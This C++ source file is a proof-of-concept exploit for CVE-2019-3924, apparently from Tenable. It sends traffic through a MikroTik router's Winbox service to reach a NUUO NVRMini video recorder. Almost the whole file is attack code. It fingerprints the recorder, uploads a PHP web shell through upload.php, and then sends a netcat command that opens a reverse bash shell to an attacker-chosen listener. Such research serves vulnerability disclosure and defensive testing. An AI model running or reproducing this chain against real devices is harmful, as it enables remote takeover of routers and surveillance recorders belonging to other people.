/*
    Copyright 2018-2019 Tenable, Inc.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                *

    Redistribution and use in source and binary forms, with or without modification,
    are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice, this
        list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
        this list of conditions and the following disclaimer in the documentation
        and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
        may be used to endorse or promote products derived from this software
        without specific prior written permission.

    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
    AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
    IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
    ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
    CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
    SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
    INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
    CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
    ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
    POSSIBILITY OF SUCH DAMAGE.
*/
#include <cstdlib>
#include <iostream>
#include <boost/cstdint.hpp>
#include <boost/program_options.hpp>
#include <boost/algorithm/string.hpp>

#include "winbox_session.hpp"
#include "winbox_message.hpp"

namespace
{
    const char s_version[] = "CVE-2019-3924 PoC NUUO Edition v1.0";

    bool parseCommandLine(int p_argCount, const char* p_argArray[],
                          std::string& p_proxy_ip, std::string& p_proxy_port,
                          std::string& p_target_ip, std::string& p_target_port,
                          std::string& p_listen_ip, std::string& p_listen_port,
                          bool& p_detect_only)
    {
        boost::program_options::options_description description("options");
        description.add_options()
            ("help,h", "A list of command line options")
            ("proxy_port", boost::program_options::value<std::string>(), "The MikroTik Winbox port to connect to")
            ("proxy_ip", boost::program_options::value<std::string>(), "The MikroTik router to connect to")
            ("target_port", boost::program_options::value<std::string>(), "The NVRMini port to connect to")
            ("target_ip", boost::program_options::value<std::string>(), "The NVRMini IP to connect to")
            ("listening_ip", boost::program_options::value<std::string>(), "The IP listening for the reverse shell")
            ("listening_port", boost::program_options::value<std::string>(), "The port listening for the reverse shell")
            ("detect_only,d", boost::program_options::bool_switch()->default_value(false), "Exit after detection logic");

        boost::program_options::variables_map argv_map;
        try
        {
            boost::program_options::store(
                boost::program_options::parse_command_line(
                    p_argCount, p_argArray, description), argv_map);
        }
        catch (const std::exception& e)
        {
            std::cerr << e.what() << std::endl;
            std::cerr << description << std::endl;
            return false;
        }

        boost::program_options::notify(argv_map);
        if (argv_map.empty() || argv_map.count("help"))
        {
            std::cerr << description << std::endl;
            return false;
        }

        if (argv_map.count("version"))
        {
            std::cerr << "Version: " << ::s_version << std::endl;
            return false;
        }

        if (argv_map.count("proxy_ip") && argv_map.count("proxy_port") &&
            argv_map.count("target_ip") && argv_map.count("target_port") &&
            argv_map.count("listening_ip") && argv_map.count("listening_port"))
        {
            p_proxy_ip.assign(argv_map["proxy_ip"].as<std::string>());
            p_proxy_port.assign(argv_map["proxy_port"].as<std::string>());
            p_target_ip.assign(argv_map["target_ip"].as<std::string>());
            p_target_port.assign(argv_map["target_port"].as<std::string>());
            p_listen_ip.assign(argv_map["listening_ip"].as<std::string>());
            p_listen_port.assign(argv_map["listening_port"].as<std::string>());
            p_detect_only = argv_map["detect_only"].as<bool>();
            return true;
        }
        else
        {
            std::cout << description << std::endl;
        }

        return false;
    }

    bool find_nvrmini2(Winbox_Session& session,
                       std::string& p_address, boost::uint32_t p_converted_address,
                       boost::uint32_t p_converted_port)
    {
        WinboxMessage msg;
        msg.set_to(104);
        msg.set_command(1);
        msg.set_request_id(1);
        msg.set_reply_expected(true);
        msg.add_string(7, "GET / HTTP/1.1\r\nHost:" + p_address + "\r\nAccept:*/*\r\n\r\n"); // text to send
        msg.add_string(8, "Network Video Recorder Login</title>"); // test to match
        msg.add_u32(3, p_converted_address); // ip address
        msg.add_u32(4, p_converted_port); // port

        session.send(msg);
        msg.reset();

        if (!session.receive(msg))
        {
            std::cerr << "Error receiving a response." << std::endl;
            return false;
        }

        if (msg.has_error())
        {
            std::cerr << msg.get_error_string() << std::endl;
            return false;
        }

        return msg.get_boolean(0xd);
    }
    
    bool upload_webshell(Winbox_Session& session, boost::uint32_t p_converted_address,
                         boost::uint32_t p_converted_port)
    {
        WinboxMessage msg;
        msg.set_to(104);
        msg.set_command(1);
        msg.set_request_id(1);
        msg.set_reply_expected(true);
        msg.add_string(7, "POST /upload.php HTTP/1.1\r\nHost:a\r\nContent-Type:multipart/form-data;boundary=a\r\nContent-Length:96\r\n\r\n--a\nContent-Disposition:form-data;name=userfile;filename=a.php\n\n<?php system($_GET['a']);?>\n--a\n");
        msg.add_string(8, "200 OK");
        msg.add_u32(3, p_converted_address);
        msg.add_u32(4, p_converted_port);

        session.send(msg);
        msg.reset();

        if (!session.receive(msg))
        {
            std::cerr << "Error receiving a response." << std::endl;
            return false;
        }

        if (msg.has_error())
        {
            std::cerr << msg.get_error_string() << std::endl;
            return false;
        }

        return msg.get_boolean(0xd);
    }

    bool execute_reverse_shell(Winbox_Session& session, boost::uint32_t p_converted_address,
                               boost::uint32_t p_converted_port, std::string& p_reverse_ip,
                               std::string& p_reverse_port)
    {
        WinboxMessage msg;
        msg.set_to(104);
        msg.set_command(1);
        msg.set_request_id(1);
        msg.set_reply_expected(true);
        msg.add_string(7, "GET /a.php?a=(nc%20" + p_reverse_ip + "%20" + p_reverse_port + "%20-e%20/bin/bash)%26 HTTP/1.1\r\nHost:a\r\n\r\n");
        msg.add_string(8, "200 OK");
        msg.add_u32(3, p_converted_address);
        msg.add_u32(4, p_converted_port);

        session.send(msg);
        msg.reset();

        if (!session.receive(msg))
        {
            std::cerr << "Error receiving a response." << std::endl;
            return false;
        }

        if (msg.has_error())
        {
            std::cerr << msg.get_error_string() << std::endl;
            return false;
        }

        return msg.get_boolean(0xd);
    }
}

int main(int p_argc, const char** p_argv)
{
    bool detect_only = false;
    std::string proxy_ip;
    std::string proxy_port;
    std::string target_ip;
    std::string target_port;
    std::string listening_ip;
    std::string listening_port;
    if (!parseCommandLine(p_argc, p_argv, proxy_ip, proxy_port, target_ip,
         target_port, listening_ip, listening_port, detect_only))
    {
        return EXIT_FAILURE;
    }

    if (detect_only)
    {
        std::cout << "[!] Running in detection mode" << std::endl;
    }
    else
    {
        std::cout << "[!] Running in exploitation mode" << std::endl;
    }

    std::cout << "[+] Attempting to connect to a MikroTik router at " << proxy_ip << ":" << proxy_port << std::endl;
    Winbox_Session winboxSession(proxy_ip, proxy_port);
    if (!winboxSession.connect())
    {
        std::cerr << "Failed to connect to the MikroTik router." << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Connected!" << std::endl;

    boost::uint32_t converted_address = ntohl(inet_network(target_ip.c_str()));
    boost::uint16_t converted_port = std::stoi(target_port);

    std::cout << "[+] Looking for a NUUO NVR at " << target_ip << ":" << target_port << std::endl;
    if (!find_nvrmini2(winboxSession, target_ip, converted_address, converted_port))
    {
      std::cerr << "[-] The target isn't a NUUO NVR." << std::endl;
      return EXIT_FAILURE;
    }
    std::cout << "[+] Found a NUUO NVR!" << std::endl;

    if (detect_only)
    {
        return EXIT_SUCCESS;
    }
    
    std::cout << "[+] Uploading a webshell" << std::endl;
    if (!upload_webshell(winboxSession, converted_address, converted_port))
    {
        std::cerr << "[-] Failed to upload the shell." << std::endl;
        return EXIT_FAILURE;
    }

    std::cout << "[+] Executing a reverse shell to " << listening_ip << ":" << listening_port << std::endl;
    if (!execute_reverse_shell(winboxSession, converted_address, converted_port,
                               listening_ip, listening_port))
    {
        std::cerr << "[-] Failed to execute the reverse shell." << std::endl;
        return EXIT_FAILURE;
    }

    std::cout << "[+] Done!" << std::endl;
    
    return EXIT_SUCCESS;
}

